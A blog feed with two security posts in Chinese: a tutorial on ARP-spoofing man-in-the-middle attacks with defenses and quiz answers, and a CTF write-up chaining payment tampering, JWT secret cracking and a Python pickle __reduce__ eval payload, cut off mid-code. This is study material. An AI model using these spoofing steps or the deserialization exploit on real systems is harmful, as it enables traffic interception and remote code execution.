{
    "version": "https://jsonfeed.org/version/1",
    "title": "GWXX",
    "description": "",
    "home_page_url": "http://Aer0Liteee.github.io",
    "items": [
        {
            "id": "http://aer0liteee.github.io/post/25fed40f.html",
            "url": "http://aer0liteee.github.io/post/25fed40f.html",
            "title": "无线网络威胁基于ARP欺骗的中间人攻击技术与防御",
            "date_published": "2024-05-29T14:49:47.000Z",
            "content_html": "<h1 id=\"无线网络威胁基于arp欺骗的中间人攻击技术与防御\"><a class=\"markdownIt-Anchor\" href=\"#无线网络威胁基于arp欺骗的中间人攻击技术与防御\">#</a> 无线网络威胁 —— 基于 ARP 欺骗的中间人攻击技术与防御</h1>\n<h2 id=\"一-概念解析\"><a class=\"markdownIt-Anchor\" href=\"#一-概念解析\">#</a> 一、概念解析</h2>\n<h3 id=\"1-中间人攻击man-in-the-middle\"><a class=\"markdownIt-Anchor\" href=\"#1-中间人攻击man-in-the-middle\">#</a> 1、中间人攻击（Man-in-the-Middle）</h3>\n<p>中间人攻击是一种网络攻击，其中两方之间的通信被拦截，通常是为了窃取登录凭据或个人信息、监视受害者、破坏通信或损坏数据。</p>\n<p>在很早之前，中间人攻击就存在，1586  年，苏格兰女王玛丽从监狱向一名支持者发送密码信件，这些信件详细说明了暗杀伊丽莎白一世女王并促成西班牙入侵英格兰的计划。警方早已监控玛丽一举一动，并截获了这些信件，然后解密了它们，警方修改了玛丽的密码信件，要求提供所有同谋者的详细信息，最后苏格兰女王和支持者因为这一证据被处决。</p>\n<p>这就是早期的中间人攻击。</p>\n<p>其实中间人攻击不难理解，而且可能在生活中我们也遇到过或者实施过中间人攻击，比如所谓的截胡，仿写等</p>\n<p><img src=\"https://pic.imgdb.cn/item/6657451cd9c307b7e97c8b70.jpg\" alt=\"中间人攻击示意图\"></p>\n<h3 id=\"2-网关\"><a class=\"markdownIt-Anchor\" href=\"#2-网关\">#</a> 2、网关</h3>\n<p>网关工作在<a href=\"https://so.csdn.net/so/search?q=OSI%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B&amp;spm=1001.2101.3001.7020\"> OSI 七层模型</a>中的传输层或者应用层，用于高层协议的不同网络之间的连接，简单地说，网关就好比是一个房间通向另一个房间的一扇门。</p>\n<h3 id=\"3-arp协议\"><a class=\"markdownIt-Anchor\" href=\"#3-arp协议\">#</a> 3、ARP 协议</h3>\n<p>ARP（Address Resolution Protocol）地址转换协议，工作在<a href=\"https://so.csdn.net/so/search?q=OSI%E6%A8%A1%E5%9E%8B&amp;spm=1001.2101.3001.7020\"> OSI 模型</a>的数据链路层，在以太网中，网络设备之间互相通信是用 MAC 地址而不是 IP 地址，ARP 协议就是用来把 IP 地址转换为 MAC 地址的。而 RARP 和 ARP 相反，它是反向地址转换协议，把 MAC 地址转换为 IP 地址。</p>\n<p>假设 A (192.168.1.2) 与 B (192.168.1.3) 在同一局域网，A 要和 B 实现通信 ——</p>\n<p>A 首先会发送一个数据包到广播地址 (192.168.1.255)，该数据包中包含了源 IP（A）、源 MAC、目的 IP（B）、目的 MAC，这个数据包会被发放给局域网中所有的主机，但是只有 B 主机会回复一个包含了源 IP（B）、源 MAC、目的 IP（A）、目的 MAC 的数据包给 A，同时 A 主机会将返回的这个地址保存在 ARP 缓存表中。</p>\n<p><img src=\"https://img1.baidu.com/it/u=637182770,1444691996&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=1007&amp;h=500\" alt=\"ARP请求示意图\"></p>\n<h2 id=\"二-攻击原理\"><a class=\"markdownIt-Anchor\" href=\"#二-攻击原理\">#</a> 二、攻击原理</h2>\n<h3 id=\"1-arp欺骗原理\"><a class=\"markdownIt-Anchor\" href=\"#1-arp欺骗原理\">#</a> 1、ARP 欺骗原理</h3>\n<p>​\t\t在每台主机都有一个 ARP 缓存表，缓存表中记录了 IP 地址与 MAC 地址的对应关系，而局域网数据传输依靠的是 MAC 地址。</p>\n<p>假设主机 A 192.168.1.2,B 192.168.1.3,C 192.168.1.4; 网关 G 192.168.1.1;  在同一局域网，主机 A 和 B 通过网关 G 相互通信，就好比 A 和 B 两个人写信，由邮递员 G 送信，C 永远都不会知道 A 和 B 之间说了些什么话。但是并不是想象中的那么安全，在 ARP 缓存表机制存在一个缺陷，就是当请求主机收到 ARP 应答包后，不会去验证自己是否向对方主机发送过 ARP 请求包，就直接把这个返回包中的 IP 地址与 MAC 地址的对应关系保存进 ARP 缓存表中，如果原有相同 IP 对应关系，原有的则会被替换。</p>\n<p>这样 C 就有了偷听 A 和 B 的谈话的可能，继续思考上面的例子：</p>\n<p>C 假扮邮递员，首先要告诉 A 说：“我就是邮递员” （C 主机向 A 发送构造好的返回包，源 IP 为 G 192.168.1.1，源 MAC 为 C 自己的 MAC 地址），愚蠢的 A 很轻易的相信了，直接把 “C 是邮递员” 这个信息记在了脑子里；</p>\n<p>C 再假扮 A，告诉邮递员：“我就是 A” （C 向网关 G 发送构造好的返回包，源 IP 为 A 192.168.1.2，源 MAC 地址为自己的 MAC 地址），智商捉急的邮递员想都没想就相信了，以后就把 B 的来信送给了 C，C 当然就可以知道 A 和 B 之间聊了些什么</p>\n<p>上面 ABCG 的故事就是 ARP 双向欺骗的原理了</p>\n<p>ARP 单向欺骗就更好理解了，C 只向 A 发送一个返回包，告诉 A：G 192.168.1.1 的 MAC 地址为  5c-63-bf-79-1d-fa（一个错误的 mac 地址），A 把这个信息记录在了缓存表中，而 G 的缓存表不变，也就是说，A 把数据包给了 C，而 G 的包还是给 A，这样就是 ARP 单向欺骗了。</p>\n<p><img src=\"https://pic.imgdb.cn/item/6657469fd9c307b7e97e56ed.png\" alt=\"ARP欺骗原理\"></p>\n<h3 id=\"2-中间人攻击\"><a class=\"markdownIt-Anchor\" href=\"#2-中间人攻击\">#</a> 2、中间人攻击</h3>\n<p>中间人攻击分为两个步骤：</p>\n<ul>\n<li>拦截</li>\n<li>解密</li>\n</ul>\n<h4 id=\"1拦截\"><a class=\"markdownIt-Anchor\" href=\"#1拦截\">#</a> （1）拦截</h4>\n<p>第一步拦截就用到了 “<strong>中间人</strong>” 这个角色，攻击者在合法数据到达预期目的地之前用假网络拦截它，拦截阶段本质上是<strong>攻击者如何将自己插入为 “中间人”</strong>，攻击者经常通过在不需要密码的公共场所创建一个虚假的 Wi-Fi 热点来做到这一点，如果受害者连接到热点，攻击者就可以访问他们执行的任何在线数据交换。</p>\n<p>其实黑客达到中间人的效果，一般会通过三种途径：</p>\n<h6 id=\"ip-欺骗\"><a class=\"markdownIt-Anchor\" href=\"#ip-欺骗\">#</a> IP 欺骗</h6>\n<p>攻击者将自己伪装成应用程序并更改 IP 地址的标头，用户在访问应用程序 URL 的时候将被重定向到攻击者的网站。</p>\n<p>黑客伪造的 wifi 中有个网页，地址为 <code>http://124.70.152.62:80/index.html</code>  黑客将其重定向到 <code>http://188.188.52.52:80/index.html</code> ，其中 <code>188.188.52.52</code>  地址就是黑客的地址，达到了 IP 欺骗的目的。</p>\n<h6 id=\"arp-欺骗\"><a class=\"markdownIt-Anchor\" href=\"#arp-欺骗\">#</a> ARP 欺骗</h6>\n<p>黑客使用伪造的 ARP 消息将其 MAC 地址与受害者的合法 IP 地址链接起来，从而可以访问正在交换的数据或信息。</p>\n<p>如图，假如你真实的路由器 ip 地址为 <code>192.168.31.1</code> ，mac 地址为 <code>00:4b:51:6a:5b:3a</code> ，你的电脑想要连接到网络，必须先连接到路由器，也就是网关，并且将相关数据传输到网关。</p>\n<p>这个时候黑客将虚假 ARP 数据包注入您的网络，ARP 数据包显示地址  <code>192.169.31.1</code> ，其 MAC 地址为  <code>11:5b:56:6a:5b:3b</code> ，这显然不是你的路由器。<br>\nARP 缓存存储将 IP 地址为  <code>192.169.31.1</code>  与 MAC 地址  <code>11:5b:56:6a:5b:3b</code>  进行关联。</p>\n<p>此后你的电脑就一直连接的是黑客伪造的路由器，而不是你真实的路由器，这就是 ARP 欺骗。</p>\n<h6 id=\"dns-欺骗\"><a class=\"markdownIt-Anchor\" href=\"#dns-欺骗\">#</a> DNS 欺骗</h6>\n<p>DNS 欺骗也称为 <strong>DNS 缓存中毒</strong>，黑客更改 DNS 服务器，将受害者的 Web 流量重定向到与预期网站非常相似的黑客仿造的网站。</p>\n<p>ARP 欺骗和 IP 欺骗都要求黑客和被攻击者处于同一局域网，但是使用 DNS 欺骗，攻击可以来自任何地方，这个就很可怕了，也就是说只要这个黑客技术很牛逼，它可以攻击世界上任何一台联网设备。</p>\n<h3 id=\"2解密\"><a class=\"markdownIt-Anchor\" href=\"#2解密\">#</a> （2）解密</h3>\n<p>数据被截获后，需要通过创建双向 SSL 流量进行解密。</p>\n<p>解密很好理解，通过第一步，黑客已经能够获劫持到用户的数据，但是用户的数据一般都是加密的，如果不进行解密，那么数据对于黑客来说毫无意义，所以第二步就是要解密这些数据。</p>\n<p>解密有好多种方式，一般常用的就以下三种：</p>\n<h6 id=\"https-欺骗\"><a class=\"markdownIt-Anchor\" href=\"#https-欺骗\">#</a> HTTPS 欺骗</h6>\n<p>HTTPS 欺骗可以让浏览器认为某个网站是安全且真实的，当用户连接到安全站点时，会向他们的浏览器发送虚假证书，从而会链接到黑客的恶意网站，一旦链接到黑客的恶意网站并且没有察觉，那么再加密的数据也跟一张白纸一样透明。</p>\n<p><img src=\"https://img2.baidu.com/it/u=499591940,1982146343&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPEG?w=865&amp;h=412\" alt=\"img\"></p>\n<h6 id=\"ssl-劫持\"><a class=\"markdownIt-Anchor\" href=\"#ssl-劫持\">#</a> SSL 劫持</h6>\n<p>黑客在连接过程中向应用程序和受害者发送伪造的身份验证密钥，这个操作是在 TCP 握手期间，如果用户没有察觉到，以为很安全，其实，黑客已经控制着整个会话。</p>\n<ul>\n<li>黑客通过一些手段先黑进你的浏览器，给你的浏览器发送 ca；</li>\n<li>你安装黑客生成的 ca；</li>\n<li>你访问页面；</li>\n<li>黑客拦截到你的请求；</li>\n<li>黑客生成证书，并用 ca 进行签名；</li>\n<li>由于浏览器已经安装好黑客的 ca，此时已经信任黑客的 ca，此时黑客可以完全看到你的数据信息；</li>\n<li>你在浏览器中输入敏感信息；</li>\n<li>浏览器将充当中继器的作用，源源不断的将你的信息传输到黑客的电脑上。</li>\n</ul>\n<h6 id=\"ssl-剥离\"><a class=\"markdownIt-Anchor\" href=\"#ssl-剥离\">#</a> SSL 剥离</h6>\n<p>从”<strong> 剥离</strong> “这两个字就能看出应该是将安全的链接转为不安全的连接，其实 SSL 剥离就是干这样的事，黑客可以使用 SSL 剥离技术来捕获数据包并将其基于 HTTPS 的地址请求更改为等效的  HTTP，HTTP 大家都只是纯文本的，没有任何安全可言，对用户来说连接到了不安全的站点，而黑客则保持与安全站点的连接。</p>\n<h2 id=\"三-实战演习\"><a class=\"markdownIt-Anchor\" href=\"#三-实战演习\">#</a> 三、实战演习</h2>\n<p>下面引用网上的一篇博客的实验实战体验一下 ARP 欺骗的实现：</p>\n<p>首先，ARP 缓存表中默认已经存在了网关 IP、MAC 地址的记录</p>\n<p><img src=\"https://pic.imgdb.cn/item/66574703d9c307b7e97ed570.jpg\" alt=\"\"></p>\n<p>看一下目标主机的 ARP 缓存表</p>\n<p><img src=\"https://pic.imgdb.cn/item/66574703d9c307b7e97ed583.jpg\" alt=\"\"></p>\n<p>目标 IP 与本机 IP</p>\n<p><img src=\"https://pic.imgdb.cn/item/66574703d9c307b7e97ed5a6.jpg\" alt=\"\"></p>\n<p>再进行 arp 欺骗之前必须要开启 IP 转发，否则当欺骗成功之后，目标机会断网，这样会被对方察觉</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">　sysctl -w net.ipv4.ip_forward=1  或者 echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://pic.imgdb.cn/item/66574703d9c307b7e97ed5b7.jpg\" alt=\"\"></p>\n<p>向目标 192.168.124.133 发送返回包，包含内容：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">　　源ip：192.168.124.2</span><br><span class=\"line\"></span><br><span class=\"line\">　　源MAC：00:0c:29:86:a1:04</span><br><span class=\"line\"></span><br><span class=\"line\">　　此时再来看目标主机ARP缓存</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://pic.imgdb.cn/item/66574704d9c307b7e97ed5c9.jpg\" alt=\"\"></p>\n<p>可以看出目标主机 arp 缓存已经发生了变化，在缓存表中所记录的网关（192.168.124.2）的 MAC 已经变为了攻击者的 MAC</p>\n<p><img src=\"https://pic.imgdb.cn/item/6657476ad9c307b7e97f5be0.jpg\" alt=\"\"></p>\n<h2 id=\"四-防御方法\"><a class=\"markdownIt-Anchor\" href=\"#四-防御方法\">#</a> 四、防御方法</h2>\n<p>中间人攻击得场景还是蛮多得，而且非常常见，那么平时我们应该如何避免中间人攻击呢？</p>\n<h3 id=\"1-不乱点可疑链接\"><a class=\"markdownIt-Anchor\" href=\"#1-不乱点可疑链接\">#</a> 1、不乱点可疑链接 ⭐</h3>\n<p>这个其实很重要，可疑链接有时候很明显，比如我们得短信，有时候会收到很明显带有诱惑性的短信，你明知道有猫腻你还去点，那么中招的不是你还能有谁呢？所以我们自己就得要做到不乱点，不要做一只好奇的猫，毕竟我们都是有技术的成年人。</p>\n<h3 id=\"2-谨慎使用公共wifi\"><a class=\"markdownIt-Anchor\" href=\"#2-谨慎使用公共wifi\">#</a> 2、谨慎使用公共 WiFi ⭐</h3>\n<p>这个同样重要，很多人中枪中间人攻击，绝大部分都是因为连接了恶意的公共 WiFi，试想一下，你连接了一个别人恶意假造的 WiFi，结果你的聊天信息、各类软件密码信息、银行卡信息都跟明文一样展示在背后的电脑屏幕中，你的阴影面积得有多大？</p>\n<p><img src=\"https://img0.baidu.com/it/u=2926139976,4110128138&amp;fm=253&amp;fmt=auto&amp;app=138&amp;f=JPG?w=600&amp;h=346\" alt=\"img\"></p>\n<p>所以，连接公共 WiFi 时一定要谨慎再谨慎，如果有必要，最好不要连公共 WiFi！</p>\n<h3 id=\"3-使用安全的协议\"><a class=\"markdownIt-Anchor\" href=\"#3-使用安全的协议\">#</a> 3、使用安全的协议</h3>\n<p>这里指的就是 HTTPS，现在大多数网站都是 HTTPS 安全的网站，当然了，考虑到 HTTPS 欺骗攻击，我们只有 HTTPS 是远远不够的，我们还得考虑配置 HTTP 严格传输安全，也就是 HSTS，HSTS 要求所有子域使用 SSL，这样的话服务器能够拒绝不安全的连接，HTTPS 欺骗和 SSL  剥离等攻击都会显得很弱小。</p>\n<h3 id=\"4-保持良好的密码习惯\"><a class=\"markdownIt-Anchor\" href=\"#4-保持良好的密码习惯\">#</a> 4、保持良好的密码习惯</h3>\n<p>你是不是每个支付软件、网银的支付密码都相同？你是不是每个聊天软件、论坛、网站等密码都相同，或者跟自己的个人身份信息相关？</p>\n<p>如果是，建议你要注意一下，最好不要设置完全相同的密码，或者说密码设置一定要复杂，这样的话会给黑客带来很大的攻击成本。</p>\n<h3 id=\"5-恰当的安装防病毒软件\"><a class=\"markdownIt-Anchor\" href=\"#5-恰当的安装防病毒软件\">#</a> 5、恰当的安装防病毒软件</h3>\n<p>这个主要是针对 Windows 系统和安卓系统，我们不要吝啬那么点内存空间，虽然说防病毒软件不能保证 100% 的安全，但是作为个人的我们，黑客是不会花那么大代价去攻击你，所以防病毒软件能够防止绝大数常见的病毒。</p>\n<h3 id=\"6-安装arp防火墙\"><a class=\"markdownIt-Anchor\" href=\"#6-安装arp防火墙\">#</a> 6、安装 ARP 防火墙</h3>\n<p>ARP（Address Resolution Protocol）防火墙是一种网络安全设备，旨在保护局域网（LAN）中的计算机免受 ARP 欺骗攻击。ARP 攻击是一种常见的网络攻击形式，攻击者通过伪造 ARP 响应，将目标计算机的 IP 地址与虚假的 MAC 地址关联起来，从而实现对网络流量的拦截、篡改或窃听。</p>\n<p>ARP 防火墙的主要功能是监视网络上的 ARP 流量，检测和阻止潜在的 ARP 欺骗攻击。它可以实时监控网络中的 ARP 请求和响应，并比较其与已知的网络拓扑信息。当检测到异常的 ARP 流量时，ARP 防火墙会采取相应的措施，如阻止虚假的 ARP 响应，更新网络设备的 ARP 缓存表，或向网络管理员发出警报。</p>\n<p>市面上常见的 ARP 防火墙通常包括以下几种类型：</p>\n<ol>\n<li><strong>硬件型 ARP 防火墙：</strong> 这种类型的 ARP 防火墙是一种独立的硬件设备，通常部署在网络的入口处或关键节点上。它们具有专门的硬件加速和处理功能，能够实时监控大量的 ARP 流量，并对恶意的 ARP 攻击进行有效防护。</li>\n<li><strong>软件型 ARP 防火墙：</strong> 这种类型的 ARP 防火墙是作为软件应用程序运行在通用的计算机或网络设备上的。它们通常作为网络安全套件的一部分，与防火墙、入侵检测系统（IDS）等其他安全功能集成在一起，为网络提供全面的安全保护。</li>\n<li><strong>集成型 ARP 防火墙：</strong> 这种类型的 ARP 防火墙将 ARP 防护功能集成到其他网络安全设备中，如防火墙、交换机、路由器等。它们通常通过软件升级或额外的许可证激活 ARP 防护功能，为网络提供全方位的安全保护。</li>\n</ol>\n<h2 id=\"五-相关习题\"><a class=\"markdownIt-Anchor\" href=\"#五-相关习题\">#</a> 五、相关习题</h2>\n<h3 id=\"单选题\"><a class=\"markdownIt-Anchor\" href=\"#单选题\">#</a> 单选题</h3>\n<ol>\n<li>\n<p>ARP 欺骗攻击是一种利用什么协议的攻击方式？ A) IP B) TCP C) ARP D) ICMP</p>\n<p>正确答案：C) ARP</p>\n</li>\n<li>\n<p>ARP 欺骗攻击中，攻击者发送什么类型的虚假信息以实施攻击？ A) 虚假 MAC 地址 B) 虚假 IP 地址 C) 虚假端口号 D) 虚假子网掩码</p>\n<p>正确答案：A) 虚假 MAC 地址</p>\n</li>\n<li>\n<p>在无线网络环境中，防止 ARP 欺骗攻击的最有效方法是： A) 使用加密的通信协议 B) 定期更新路由表 C) 使用网络入侵检测系统（IDS） D) 启用 ARP 欺骗检测和防御机制</p>\n<p>正确答案：D) 启用 ARP 欺骗检测和防御机制</p>\n</li>\n<li>\n<p>下列哪种技术可以帮助检测 ARP 欺骗攻击？ A) 隔离无线网络 B) 使用双因素认证 C) ARP 缓存检查 D) 隐藏网络 SSID</p>\n<p>正确答案：C) ARP 缓存检查</p>\n</li>\n<li>\n<p>下列哪种行为可能表明你的无线网络受到 ARP 欺骗攻击？ A) 无法连接到网络 B) 网络速度突然变慢 C) 频繁断开连接 D) 所有设备都无法访问互联网</p>\n<p>正确答案：B) 网络速度突然变慢</p>\n</li>\n<li>\n<p>当发现有 ARP 欺骗攻击时，最好的反应是： A) 立即关闭网络 B) 联系网络服务提供商 C) 更新防病毒软件 D) 寻找并隔离攻击者，并采取修复措施</p>\n<p>正确答案：D) 寻找并隔离攻击者，并采取修复措施</p>\n<h3 id=\"多选题\"><a class=\"markdownIt-Anchor\" href=\"#多选题\">#</a> 多选题</h3>\n</li>\n<li>\n<p>下列哪些是 ARP 欺骗攻击可能导致的安全威胁？（可选择多个） A) 窃取敏感数据 B) 网络拒绝服务（DoS） C) 网络流量篡改 D) 未经授权的访问 E) 恶意软件传播</p>\n<p>正确答案：A) 窃取敏感数据，C) 网络流量篡改，D) 未经授权的访问</p>\n</li>\n<li>\n<p>以下哪些是防御 ARP 欺骗攻击的有效措施？（可选择多个） A) 使用加密的无线网络 B) 定期更新防火墙软件 C) 启用 ARP 欺骗检测机制 D) 使用虚拟专用网络（VPN）连接 E) 隐藏网络 SSID</p>\n<p>正确答案：A) 使用加密的无线网络，C) 启用 ARP 欺骗检测机制，D) 使用虚拟专用网络（VPN）连接</p>\n</li>\n<li>\n<p>下列哪些行为可能表明你的网络受到 ARP 欺骗攻击？（可选择多个） A) 网络流量异常增加 B) 未知设备出现在网络上 C) 客户端无法获得 IP 地址 D) ARP 缓存表中出现重复的 IP 地址 E) 网络中某些设备无法相互通信</p>\n<p>正确答案：B) 未知设备出现在网络上，C) 客户端无法获得 IP 地址，D) ARP 缓存表中出</p>\n</li>\n</ol>\n<h2 id=\"六-参考博客\"><a class=\"markdownIt-Anchor\" href=\"#六-参考博客\">#</a> 六、参考博客</h2>\n<p><a href=\"https://developer.aliyun.com/article/991746\">https://developer.aliyun.com/article/991746</a></p>\n<p><a href=\"https://blog.csdn.net/IndexCSDN/article/details/82255871\">https://blog.csdn.net/IndexCSDN/article/details/82255871</a></p>\n",
            "tags": []
        },
        {
            "id": "http://aer0liteee.github.io/post/d1c69b0f.html",
            "url": "http://aer0liteee.github.io/post/d1c69b0f.html",
            "title": "记两道CTF题",
            "date_published": "2023-08-06T08:40:39.000Z",
            "content_html": "<h1 id=\"记两道ctf题\"><a class=\"markdownIt-Anchor\" href=\"#记两道ctf题\">#</a> 记两道 CTF 题</h1>\n<h2 id=\"ciscn2019-华北赛区-day1-web2ikun\"><a class=\"markdownIt-Anchor\" href=\"#ciscn2019-华北赛区-day1-web2ikun\">#</a> [CISCN2019 华北赛区 Day1 Web2] ikun</h2>\n<ul>\n<li>考点：\n<ul>\n<li>Python 爬虫</li>\n<li>Python Pickle 反序列化 <code>__reduce__</code> 方法 RCE</li>\n</ul>\n</li>\n</ul>\n<ol>\n<li>\n<p>进入题目，发现提示，需要购买到 lv6</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf5e1f1ddac507cc4698c6.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>点击下一页，发现 url 处多了一个 page 参数，写一个 python 脚本，查找 lv6 所在的页面</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"number\">200</span>):</span><br><span class=\"line\">    url = <span class=\"string\">&#x27;http://3e882053-9d6e-4069-8a67-f9225c6ce75a.node4.buuoj.cn:81/shop?page=&#x27;</span>+<span class=\"built_in\">str</span>(i)</span><br><span class=\"line\">    data = requests.get(url).text</span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"string\">&quot;lv6.png&quot;</span> <span class=\"keyword\">in</span> data:</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(i)</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://pic.imgdb.cn/item/64cf5ea21ddac507cc47bebb.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>得到在 page=181 页处出现 lv6，点击购买，失败，应该是 money 不够</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf5ee91ddac507cc485d23.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>Bp 抓包修改金额 / 优惠，尝试支付逻辑漏洞，成功，这里不能修改金额，于是修改 discount 折扣降为 0.000001，得到回显提示访问 /b1g_m4mber</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf5f811ddac507cc49c055.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>访问 /b1g_m4mber，提示需要 admin 用户才能登录，联想到伪造 admin 用户，查看 cookie</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf602a1ddac507cc4b35cd.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>发现有 JWT 验证，把他复制下来扔到 https://jwt.io/ 这个网站解密，发现自己注册时的用户名 “1”</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf60d11ddac507cc4ca91f.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>于是修改成 admin，再放回原网页，但报错了网页返回 500: Internal Server Error，考虑这里可能存在 JWT 秘钥，尝试使用 c-jwt-cracker 工具爆破 JWT 秘钥，成功得到秘钥为 &quot;1Kun&quot;</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf61a01ddac507cc4eeaea.jpg\" alt=\"\"></p>\n<ul>\n<li>\n<p>附 c-jwt-cracker 工具安装教程</p>\n<ul>\n<li>\n<p>— 下载地址：<a href=\"https://github.com/brendan-rius/c-jwt-cracker\">https://github.com/brendan-rius/c-jwt-cracker</a></p>\n</li>\n<li>\n<p>— 安装方式：</p>\n<ul>\n<li>\n<p>在本地 c-jwt-cracker 文件夹下依次运行：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install libssl-dev</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>— 运行命令：</p>\n<ul>\n<li>\n<p>Code</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./jwtcrack &quot;JWT&quot;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<p>返回刚刚 JWT 那个网站，添加密钥 &quot;1Kun&quot; 再次生成 JWT</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf64011ddac507cc54ab00.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>返回题目网站修改 JWT，登录成功</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf64ca1ddac507cc56772b.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>点击一键成为大会员，但没用，查看源码发现提示 www.zip，下载到本地分析</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf64c61ddac507cc566d44.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>查看到 Admin.py 时发现此处引入了 pickle 模块对 /b1g_m4mber 页面 POST 传入的参数 become 进行了反序列化，此处正是利用点</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf6a421ddac507cc61e9d9.jpg\" alt=\"\"></p>\n<blockquote>\n<p><code>pickle</code>  是 Python 中的一个模块，用于序列化（将对象转换为字节流）和反序列化（将字节流转换回对象）Python 对象。它可以将复杂的数据结构，如字典、列表、类实例等，转换成字节流，从而方便存储、传输和重建这些对象。</p>\n<p><strong>Pickle 反序列化</strong>是指将之前序列化过的字节流重新转换成原始的 Python 对象。这可以用于恢复数据、传递数据以及在编程中保存和加载对象。</p>\n<p>在 CTF（Capture The Flag）比赛中， <code>pickle</code>  反序列化可能被滥用为一种攻击向量。恶意用户可能会通过构造特定的字节流，利用不当的反序列化操作，来触发代码执行、读取敏感信息或进行其他恶意活动。</p>\n</blockquote>\n<ul>\n<li>\n<p>下面一个简单例子，展示如何使用 pickle 进行序列化和反序列化：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 定义一个简单的类</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Person</span>:</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, name, age</span>):</span><br><span class=\"line\">        self.name = name</span><br><span class=\"line\">        self.age = age</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建一个 Person 对象</span></span><br><span class=\"line\">person1 = Person(<span class=\"string\">&quot;Alice&quot;</span>, <span class=\"number\">30</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 pickle 进行序列化</span></span><br><span class=\"line\">serialized_data = pickle.dumps(person1)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 将序列化后的数据存储到文件</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;person.pickle&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(serialized_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 使用 pickle 进行反序列化</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;person.pickle&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    loaded_data = f.read()</span><br><span class=\"line\">    person2 = pickle.loads(loaded_data)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 打印反序列化得到的对象的属性</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(person2.name)  <span class=\"comment\"># 输出: Alice</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(person2.age)   <span class=\"comment\"># 输出: 30</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n</li>\n<li>\n<p>分析得知是利用 pickle 反序列化后，利用 pickle 与 python 的魔术方法 <code>__reduce__</code> 实现恶意执行命令</p>\n<p><img src=\"https://pic.imgdb.cn/item/64cf6b4f1ddac507cc63fdaa.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p>当 <code>__reduce__</code> 被定义之后，该对象被 Pickle 时就会被调用到此处的 eval，用于重建对象的时候调用，在方法内告诉 python 使用 eval 读取 flag 文件，就能达到恶意执行命令的效果，然后，通过 URL 编码和打印的方式，将这个恶意的  <code>pickle</code>  数据展示出来：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> pickle</span><br><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">exp</span>(<span class=\"title class_ inherited__\">object</span>):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__reduce__</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (<span class=\"built_in\">eval</span>,(<span class=\"string\">&quot;open(&#x27;/flag.txt&#x27;).read()&quot;</span>,))</span><br><span 